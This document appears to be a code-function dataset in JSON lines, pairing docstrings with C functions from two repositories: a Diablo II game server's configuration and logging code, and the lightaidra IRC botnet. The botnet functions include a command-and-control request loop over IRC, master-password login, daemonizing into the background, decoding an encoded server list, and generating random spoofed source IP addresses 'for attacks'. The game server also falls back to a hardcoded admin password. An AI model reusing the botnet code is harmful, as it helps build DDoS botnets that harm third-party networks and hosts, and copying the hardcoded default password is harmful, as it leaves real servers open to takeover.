DEBUG_ON_CONSOLE\n\tfprintf(stdout, \"\\n\");\n#endif\n\treturn;\n\n}", "path": "D2GS\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to read a dword key to the variable\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int RegkeyReadDWORD(HKEY hKey, LPCTSTR name, DWORD *val)", "code": "{\n\tDWORD\tdwType, dwLen, dwVal;\n\tLONG\tlReturn;\n\n\tif ((!hKey) || (!name))\n\t\treturn FALSE;\n\tdwLen = sizeof(dwVal);\n\tlReturn = RegQueryValueEx(hKey, name, NULL, &dwType, (LPBYTE)&dwVal, &dwLen);\n\tif (lReturn==ERROR_SUCCESS) {\n\t\t*val = dwVal;\n\t\treturn TRUE;\n\t} else\n\t\treturn FALSE;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to read configurations to the D2GSCONFIGS structure\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSReadConfig(void)", "code": "{\n\tHKEY\t\thKey;\n\tBOOL\t\tresult;\n\tu_long\t\tipaddr;\n\tDWORD\t\tdwval;\n\tchar\t\tstrbuf[256];\n\n\tresult = FALSE;\n\tif (!RegkeyOpen(HKEY_LOCAL_MACHINE, REGKEY_ROOT, &hKey, KEY_READ)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't open registry key '\\\\\\\\HKEY_LOCAL_MACHINE\\\\%s'\", REGKEY_ROOT);\n\t\t//return result;\n\t}\n\n\t/* D2CSIP */\n\tif (!RegkeyReadString(hKey, REGKEY_D2CSIP, strbuf, sizeof(strbuf))) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s'\", REGKEY_D2CSIP);\n\t\tgoto tocloseregkey;\n\t}\n\tprintf(\":%s\", strbuf);\n\tipaddr = inet_addr(strbuf);\n\tif (ipaddr==INADDR_NONE) {\n\t\tprintf(\"i\");\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Invalid D2CSIP '%s'\", strbuf);\n\t\tgoto tocloseregkey;\n\t}\n\td2gsconf.d2csip = ipaddr;\n\n\t/* D2DBSIP */\n\tif (!RegkeyReadString(hKey, REGKEY_D2DBSIP, strbuf, sizeof(strbuf))) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s'\", REGKEY_D2DBSIP);\n\t\tgoto tocloseregkey;\n\t}\n\tipaddr = inet_addr(strbuf);\n\tif (ipaddr==INADDR_NONE) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Invalid D2DBSIP '%s'\", strbuf);\n\t\tgoto tocloseregkey;\n\t}\n\td2gsconf.d2dbsip = ipaddr;\n\n\t/* D2CSPORT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_D2CSPORT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_D2CSPORT, DEFAULT_D2CS_PORT);\n\t\td2gsconf.d2csport = DEFAULT_D2CS_PORT;\n\t} else\n\t\td2gsconf.d2csport = htons((u_short)dwval);\n\n\t/* D2DBSPORT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_D2DBSPORT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_D2DBSPORT, DEFAULT_D2DBS_PORT);\n\t\td2gsconf.d2csport = DEFAULT_D2DBS_PORT;\n\t} else\n\t\td2gsconf.d2dbsport = htons((short)dwval);\n\n\t/* MAXGAMES */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_MAXGAMES, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_MAXGAMES, DEFAULT_MAX_GAMES);\n\t\td2gsconf.gemaxgames = DEFAULT_MAX_GAMES;\n\t} else\n\t\td2gsconf.gemaxgames = dwval;\n\td2gsconf.gsmaxgames = 0;\n\n\t/* ENABLENTMODE */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLENTMODE, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLENTMODE, DEFAULT_NT_MODE);\n\t\td2gsconf.enablentmode = DEFAULT_NT_MODE;\n\t} else\n\t\td2gsconf.enablentmode = (BOOL)dwval;\n\n\t/* ENABLEGEPATCH */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLEGEPATCH, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLEGEPATCH, DEFAULT_GE_PATCH);\n\t\td2gsconf.enablegepatch = DEFAULT_GE_PATCH;\n\t} else\n\t\td2gsconf.enablegepatch = (BOOL)dwval;\n\n\t/* ENABLEPRECACHEMODE */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLEPRECACHEMODE, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLEPRECACHEMODE, DEFAULT_PRECACHE_MODE);\n\t\td2gsconf.enableprecachemode = DEFAULT_PRECACHE_MODE;\n\t} else\n\t\td2gsconf.enableprecachemode = (BOOL)dwval;\n\n\t/* ENABLEGELOG */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLEGELOG, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLEGELOG, DEFAULT_GE_LOG);\n\t\td2gsconf.enablegelog = DEFAULT_GE_LOG;\n\t} else\n\t\td2gsconf.enablegelog = (BOOL)dwval;\n\n\t/* ENABLEGSLOG */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLEGSLOG, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLEGELOG, DEFAULT_GS_LOG);\n\t\td2gsconf.enablegslog = DEFAULT_GS_LOG;\n\t} else\n\t\td2gsconf.enablegslog = (BOOL)dwval;\n\n\t/* ENABLEGEMSG */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ENABLEGEMSG, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ENABLEGEMSG, DEFAULT_GE_MSG);\n\t\td2gsconf.enablegemsg = DEFAULT_GE_MSG;\n\t} else\n\t\td2gsconf.enablegemsg = (BOOL)dwval;\n\n\t/* DEBUGNETPACKET */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_DEBUGNETPACKET, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_DEBUGNETPACKET, DEFAULT_DEBUGNETPACKET);\n\t\td2gsconf.debugnetpacket = DEFAULT_DEBUGNETPACKET;\n\t} else\n\t\td2gsconf.debugnetpacket = (BOOL)dwval;\n\n\t/* DEBUGEVENTCALLBACK */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_DEBUGEVENTCALLBACK, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_DEBUGEVENTCALLBACK, DEFAULT_DEBUGEVENTCALLBACK);\n\t\td2gsconf.debugeventcallback = DEFAULT_DEBUGEVENTCALLBACK;\n\t} else\n\t\td2gsconf.debugeventcallback = (BOOL)dwval;\n\n\t/* IDLESLEEP */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_IDLESLEEP, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_IDLESLEEP, DEFAULT_IDLE_SLEEP);\n\t\td2gsconf.idlesleep = DEFAULT_IDLE_SLEEP;\n\t} else\n\t\td2gsconf.idlesleep = dwval;\n\n\t/* BUSYSLEEP */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_BUSYSLEEP, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_BUSYSLEEP, DEFAULT_BUSY_SLEEP);\n\t\td2gsconf.busysleep = DEFAULT_BUSY_SLEEP;\n\t} else\n\t\td2gsconf.busysleep = dwval;\n\n\t/* CHARPENDINGTIMEOUT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_CHARPENDINGTIMEOUT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_CHARPENDINGTIMEOUT, DEFAULT_CHARPENDINGTIMEOUT);\n\t\td2gsconf.charpendingtimeout = DEFAULT_CHARPENDINGTIMEOUT;\n\t} else\n\t\td2gsconf.charpendingtimeout = dwval;\n\n\t/* INTERVALRECONNECTD2CS */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_INTERVALRECONNECTD2CS, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_INTERVALRECONNECTD2CS, DEFAULT_INTERVALRECONNECTD2CS);\n\t\td2gsconf.intervalreconnectd2cs = DEFAULT_INTERVALRECONNECTD2CS;\n\t} else\n\t\td2gsconf.intervalreconnectd2cs = dwval;\n\n\t/* ADMINPWD */\n\tZeroMemory(d2gsconf.adminpwd, sizeof(d2gsconf.adminpwd));\n\tif (!RegkeyReadString(hKey, REGKEY_ADMINPWD, strbuf, sizeof(strbuf))) {\n\t\tstrcpy(d2gsconf.adminpwd, \"d2gsdmin\");\n\t} else\n\t\tstrncpy(d2gsconf.adminpwd, strbuf, sizeof(d2gsconf.adminpwd)-1);\n\n\t/* D2CSSECRECT */\n\tZeroMemory(d2gsconf.d2cssecrect, sizeof(d2gsconf.d2cssecrect));\n\tif (!RegkeyReadString(hKey, REGKEY_D2CSSECRECT, strbuf, sizeof(strbuf))) {\n\t\tstrcpy(d2gsconf.d2cssecrect, \"\");\n\t} else\n\t\tstrncpy(d2gsconf.d2cssecrect, strbuf, sizeof(d2gsconf.d2cssecrect)-1);\n\n\t/* ADMINPORT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ADMINPORT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ADMINPORT, DEFAULT_ADMIN_PORT);\n\t\td2gsconf.adminport = DEFAULT_D2DBS_PORT;\n\t} else\n\t\td2gsconf.adminport = htons((short)dwval);\n\n\t/* ADMINTIMEOUT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_ADMINTIMEOUT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_ADMINTIMEOUT, DEFAULT_ADMIN_TIMEOUT);\n\t\td2gsconf.admintimeout = DEFAULT_ADMIN_TIMEOUT;\n\t} else\n\t\td2gsconf.admintimeout = dwval;\n\n\t/* MAXGAMELIFE */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_MAXGAMELIFE, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_MAXGAMELIFE, DEFAULT_MAXGAMELIFE);\n\t\td2gsconf.maxgamelife = DEFAULT_MAXGAMELIFE;\n\t} else\n\t\td2gsconf.maxgamelife = dwval;\n\n\t/* GSSHUTDOWNINTERVAL */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_GSSHUTDOWNINTERVAL, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_GSSHUTDOWNINTERVAL, DEFAULT_GS_SHUTDOWN_INTERVAL);\n\t\td2gsconf.gsshutdowninterval = DEFAULT_GS_SHUTDOWN_INTERVAL;\n\t} else\n\t\td2gsconf.gsshutdowninterval = dwval;\n\n\t/* MULTICPUMASK */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_MULTICPUMASK, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_MULTICPUMASK, DEFAULT_MULTICPUMASK);\n\t\td2gsconf.multicpumask = DEFAULT_MULTICPUMASK;\n\t} else\n\t\td2gsconf.multicpumask = dwval;\n\n\t/* LISTENPORT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_LISTENPORT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_LISTENPORT, DEFAULT_LISTENPORT);\n\t\td2gsconf.listenport = DEFAULT_LISTENPORT;\n\t} else\n\t\td2gsconf.listenport = dwval;\n\n\t/* LISTENADDR */\n\tZeroMemory(d2gsconf.listenaddr, sizeof(d2gsconf.listenaddr));\n\tif (!RegkeyReadString(hKey, REGKEY_LISTENADDR, strbuf, sizeof(strbuf))) {\n\t\tstrcpy(d2gsconf.listenaddr, \"0.0.0.0\");\n\t} else\n\t\tstrncpy(d2gsconf.listenaddr, strbuf, sizeof(d2gsconf.listenaddr)-1);\n\n\t/* GETHREAD */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_GETHREAD, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_GETHREAD, DEFAULT_GETHREAD);\n\t\td2gsconf.gethread = DEFAULT_GETHREAD;\n\t} else\n\t\td2gsconf.gethread = dwval;\n\n\t/* SYNPROT */\n\tif (!RegkeyReadDWORD(hKey, REGKEY_SYNPROT, &dwval)) {\n\t\tD2GSEventLog(\"D2GSReadConfig\", \"Can't read key '%s', set to default %d\",\n\t\t\t\tREGKEY_SYNPROT, DEFAULT_SYNPROT);\n\t\td2gsconf.synprot = DEFAULT_SYNPROT;\n\t} else\n\t\td2gsconf.synprot = dwval;\n\n\t/* MOTD */\n\tZeroMemory(d2gsconf.motd, sizeof(d2gsconf.motd));\n\tif (RegkeyReadString(hKey, REGKEY_MOTD, strbuf, sizeof(strbuf)))\n\t\tstrncpy(d2gsconf.motd, strbuf, sizeof(d2gsconf.motd)-1);\n\tstrcpy(d2gsconf.motd, strbuf);\n\tstring_color(d2gsconf.motd);\n\n\td2gsconf.eventmotd[0] = 0;\n\td2gsconf.roomMotd[0] = 0;\n\n\tresult = TRUE;\n\ntocloseregkey:\n\tRegkeyClose(hKey);\n\treturn result;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to initialize the envet log system\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GEEventLogInitialize(int d2ge_id)", "code": "{\n\tchar buf[255];\n\tsprintf(buf, \"d2ge-%d.log\", d2ge_id);\n\tgestrm    = fopen(buf, \"a\");\n\n\tif (gestrm) return TRUE;\n\telse return FALSE;\n\n}", "path": "D2GE\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to read a string key to the buffer\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int RegkeyReadString(HKEY hKey, LPCTSTR name, char *buf, DWORD buflen)", "code": "{\n\tDWORD\tdwType, dwLen;\n\tLONG\tlReturn;\n\n\tif ((!hKey) || (!name))\n\t\treturn FALSE;\n\tdwLen = buflen;\n\tZeroMemory(buf, buflen);\n\tlReturn = RegQueryValueEx(hKey, name, NULL, &dwType, buf, &dwLen);\n\tif (lReturn==ERROR_SUCCESS) {\n\t\t*(buf+buflen-1) = 0;\n\t\treturn TRUE;\n\t} else\n\t\treturn FALSE;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to set the MaxGameLife\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSSetMaxGameLife(DWORD maxgamelife)", "code": "{\n\td2gsconf.maxgamelife = maxgamelife;\n\treturn D2GSSetConfigDWORD(REGKEY_MAXGAMELIFE, maxgamelife);\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to set the MaxGames\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSSetMaxGames(DWORD maxgames)", "code": "{\n\td2gsconf.gsmaxgames = maxgames;\n\treturn D2GSSetConfigDWORD(REGKEY_MAXGAMES, maxgames);\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to log the event to the file or the standard output, for GE\n * Return: none\n *********************************************************************/\n", "func_signal": "void D2GEEventLog(char const * module, char const * fmt, ...)", "code": "{\n\tva_list\t\targs;\n\tchar\t\ttime_string[EVENT_TIME_MAXLEN];\n\tSYSTEMTIME\tst;\n\n    if (!d2gsconf.enablegelog) return;\n\tif (!gestrm) return;\n\n\tGetLocalTime(&st);\n\tsprintf(time_string, \"%02d/%02d %02d:%02d:%02d.%03d\", st.wMonth, st.wDay,\n\t\tst.wHour, st.wMinute, st.wSecond, st.wMilliseconds);\n    \n\tif (!module) {\n\t\tfprintf(gestrm,\"%s eventlog: got NULL module\\n\", time_string);\n\t\tfflush(gestrm);\n#ifdef DEBUG_ON_CONSOLE\n\t\tfprintf(stdout,\"%s eventlog: got NULL module\\n\", time_string);\n#endif\n\t\treturn;\n\t}\n\tif (!fmt) {\n\t\tfprintf(gestrm,\"%s eventlog: got NULL fmt\\n\", time_string);\n\t\tfflush(gestrm);\n#ifdef DEBUG_ON_CONSOLE\n\t\tfprintf(stdout,\"%s eventlog: got NULL fmt\\n\", time_string);\n#endif\n\t\treturn;\n\t}\n    \n\tfprintf(gestrm,\"%s %s: \", time_string, module);\n#ifdef DEBUG_ON_CONSOLE\n\tfprintf(stdout,\"%s %s: \", time_string, module);\n#endif\n\tva_start(args, fmt);\n\tvfprintf(gestrm, fmt, args);\n#ifdef DEBUG_ON_CONSOLE\n\tvfprintf(stdout, fmt, args);\n#endif\n\tva_end(args);\n\tfprintf(gestrm, \"\\n\");\n\tfflush(gestrm);\n#ifdef DEBUG_ON_CONSOLE\n\tfprintf(stdout, \"\\n\");\n#endif\n\treturn;\n\n}", "path": "D2GE\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to dump the portrait of a char\n * Return: none\n *********************************************************************/\n", "func_signal": "void PortraitDump(LPCSTR lpAccountName, LPCSTR lpCharName, LPCSTR lpCharPortrait)", "code": "{\n#ifndef DEBUG\n\n\treturn;\n\n#else\n\tFILE\t*fp;\n\tchar\tfilename[MAX_PATH];\n\n\tif (!lpAccountName || !lpCharName) return;\n\tsprintf(filename, \"portrait\\\\%s\", lpCharName);\n\tfp = fopen(filename, \"wb\");\n\tif (!fp) return;\n\tfwrite(lpCharPortrait, 1, strlen(lpCharPortrait)+1, fp);\n\tfclose(fp);\n\treturn;\n\n#endif\n\n}", "path": "D2GS\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/* sockwrite(int, const char *) */\n/* socket send function.        */\n", "func_signal": "int sockwrite(int sd, const char *fmt, ...)", "code": "{\n    char s_buf[sizebuf];\n    va_list args;\n\n    va_start(args, fmt);\n    vsnprintf(s_buf, sizebuf - 1, fmt, args);\n    va_end(args);\n\n    if (send(sd, s_buf, strlen(s_buf), MSG_NOSIGNAL) < true) return EXIT_FAILURE;\n\n    return EXIT_SUCCESS;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* host2ip(char *)                       */\n/* convert hostname to ip address.       */\n/* i've found that function with google. */\n", "func_signal": "unsigned int host2ip(char *hostname)", "code": "{\n\n    static struct in_addr i;\n    struct hostent *h;\n\n    i.s_addr = inet_addr((const char *)hostname);\n    \n    if (i.s_addr == -1) {\n        h = gethostbyname(hostname);\n\n        if (h == NULL) exit(0);\n        \n        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);\n    }\n\n    return i.s_addr;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* irc_requests(sock_t *, requests_t *) */\n/* manage the requests.                 */\n", "func_signal": "int irc_requests(sock_t *sp, requests_t *req)", "code": "{\n    if (max_pids > 0) kill(g_pid, 9);\n\n    stop = 0;\n    max_pids = 0;\n    login_status = false;\n    srchost = 0;\n\n    for (;;) {\n        while ((pid = waitpid(-1, &pid_status, WNOHANG)) > 0) max_pids = 0;\n\n        if (max_pids == 0 && stop == 0) {\n            sleep(2);\n            sockwrite(sp->sockfd, \"TOPIC %s\\n\", channel);\n        }\n\n        /* stay alive in irc when operating started. */\n        /* to prevent the connection reset           */\n        if (max_pids > 0) {\n            sleep(4);\n            cmd_ping(sp);\n        }\n\n        memset(netbuf, 0, sizeof netbuf);\n        recv_bytes = recv(sp->sockfd, netbuf, sizebuf - 1, 0);\n\n        if (recv_bytes == true) return EXIT_FAILURE;\n        netbuf[recv_bytes] = 0;\n            \n        if (background_mode) {\n            puts(netbuf);\n            fflush(stdout);\n        }\n\n        if (pub_requests(sp, req)) return EXIT_FAILURE;\n    }\n\n    return EXIT_SUCCESS;\n}", "path": "source\\irc.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* getrstr(void)                */\n/* return a random char string. */\n", "func_signal": "char *getrstr()", "code": "{\n    char rdnick[] = { \"0ab1cd2ef3gh4il5mn6op7qr8st9uvz_wyjkx\" };\n    char nm[16];\n    int nc;\n\n    data_ptr = (char *)malloc(15);\n\n    memset(nm, 0, sizeof nm);\n    srand(time(0));\n\n    for (nc = 0; nc < 10; nc++) {\n        nm[nc] = rdnick[rand()%strlen(rdnick)];\n    }\n\n    snprintf(data_ptr, 15, \"%s%s\", irc_nick_prefix, nm);\n    return data_ptr;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* wordcmp(const char *, requests_t *) */\n/* a menu strncmp function.            */\n", "func_signal": "int wordcmp(const char *s, requests_t *req)", "code": "{\n    if (strlen(req->rcv_sa)) {\n        if (strncmp(req->rcv_sa, s, strlen(s)) == true && strlen(req->rcv_sa) == strlen(s))\n            return EXIT_SUCCESS;\n    }\n\n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* daemonize(void)               */\n/* set Aidra in background mode. */\n", "func_signal": "void daemonize()", "code": "{\n    daemonize_pid = fork();\n    if (daemonize_pid) exit(EXIT_SUCCESS);\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* cmd_spoof(sock_t *, requests_t *) */\n/* set an address for ip spoofing */\n", "func_signal": "void cmd_spoof(sock_t *sp, requests_t *req)", "code": "{\n    if (parse_input_errors(sp, req, 1, 0)) return;\n\n    if (!strncmp(req->rcv_sb, \"0\", 1)) {\n        srchost = 0;\n        sockwrite(sp->sockfd, \"PRIVMSG %s :[spoof] spoofing set as random ip!\\n\", channel);\n        return;\n    }\n    \n    if (strlen(req->rcv_sb) < 7 || strlen(req->rcv_sb) > 15) {  \n        sockwrite(sp->sockfd, \"PRIVMSG %s :[error] one error in your input data, see help!\\n\", channel);\n        return;\n    } \n    else {\n        srchost = (unsigned int)host2ip(req->rcv_sb);\n        sockwrite(sp->sockfd, \"PRIVMSG %s :[spoof] spoofing set as ip: %s\\n\", channel, req->rcv_sb);\n        return;\n    }\n\n    return;\n}", "path": "source\\requests.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* get_spoofed_addr()                    */\n/* return a spoofed address for attacks. */\n", "func_signal": "unsigned int get_spoofed()", "code": "{\n    char spa[21];\n    int a, b, c, d;\n\n    srand(time(0));\n\n    random_ct = rand();\n    random_num = ((random_ct % 254) + 1);\n    a = random_num;\n\n    random_ct = rand();\n    random_num = ((random_ct % 254) + 1);\n    b = random_num;\n\n    random_ct = rand();\n    random_num = ((random_ct % 254) + 1);\n    c = random_num;\n\n    random_ct = rand();\n    random_num = ((random_ct % 254) + 1);\n    d = random_num;\n\n    snprintf(spa, sizeof(spa), \"%d.%d.%d.%d\", a, b, c, d);\n\n    return ((unsigned int)host2ip(spa));\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* getextip(sock_t *, requests_t *) */\n/* get extern ip address.                */\n", "func_signal": "int getextip(sock_t *sp, requests_t *req)", "code": "{\n    int a, b, x = 0;\n    char temp[512], *tok;\n    sock_t *gfd;\n\n    gfd = (sock_t *) malloc(sizeof(sock_t));\n    gfd->sockhs = gethostbyname(ipreq);\n    gfd->sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    gfd->sockadr.sin_family = AF_INET;\n    gfd->sockadr.sin_port = htons(http_port);\n\n    gfd->sockadr.sin_addr = *((struct in_addr *)gfd->sockhs->h_addr);\n\n    memset(gfd->sockadr.sin_zero, '\\0', sizeof gfd->sockadr.sin_zero);\n\n    if (connect(gfd->sockfd, (struct sockaddr *)&gfd->sockadr, sizeof gfd->sockadr) == false) {\n        close(gfd->sockfd);\n        free(gfd);\n        return EXIT_FAILURE;\n    }\n\n    send(gfd->sockfd, IPREQUEST, strlen(IPREQUEST), 0);\n    memset(temp, 0, sizeof temp);\n    recv(gfd->sockfd, temp, sizeof(temp)-1, 0);\n\n    x = 0;\n    tok = strtok(temp, \"\\n\\n\");\n    \n    while (tok != NULL) {\n        if (x == 10) {\n            sscanf(tok, \"%d.%d.%*s.%*s\", &a,&b);\n            snprintf(req->rcv_sb, 4, \"%d\", a);\n            snprintf(req->rcv_sc, 4, \"%d\", b);\n\n            if (a > 255 || b > 255) return EXIT_FAILURE;    \n\n            close(gfd->sockfd);\n            free(gfd);\n            return EXIT_SUCCESS;\n        }\n        \n        x++;\n        tok = strtok(NULL, \"\\n\");\n    }\n\n    close(gfd->sockfd);\n    free(gfd);\n\n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* login(sock_t *, requests_t *) */\n/* log in party-line bot.        */\n", "func_signal": "int login(sock_t *sp, requests_t *req)", "code": "{\n    if (strstr(req->rcv_a, master_host)) {\n        if (strncmp(master_password, req->rcv_sb, strlen(master_password)) == true) {\n            sockwrite(sp->sockfd, \"PRIVMSG %s :[login] you are logged in, (%s).\\n\", channel, req->rcv_a + 1);\n            return EXIT_SUCCESS;\n        } \n        else {\n            sockwrite(sp->sockfd, \"PRIVMSG %s :[!login] sorry, wrong authenthication password!\\n\", channel);\n        }\n    }\n\n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* twordcmp(const char *, requests_t *) */\n/* a topic strncmp function.            */\n", "func_signal": "int twordcmp(const char *s, requests_t *req)", "code": "{\n    if (strncmp(s, req->rcv_sb, strlen(s)) == true) return EXIT_SUCCESS;\n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* create_irc_servlist()      */\n/* create a irc servers list. */\n", "func_signal": "void create_irc_servlist()", "code": "{\n    unsigned short x = 0;\n    char s_copy[512], *token;\n\n    memset(s_copy, 0, sizeof s_copy);\n    if (encirc != 0) {\n        decode(enc_servers, 0);\n        strncpy(s_copy, decodedsrv, sizeof(s_copy));\n    }\n    else {\n        strncpy(s_copy, irc_servers, sizeof(s_copy));\n    }\n\n    token = strtok(s_copy, \"|\");\n\n    while (token != NULL) {\n        if (x <= 10) {\n            strncpy(isrv[x], token, 31);\n            x++;\n        }\n\n        token = strtok(NULL, \"|\");\n    }\n\n    total = x-2;\n    return;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
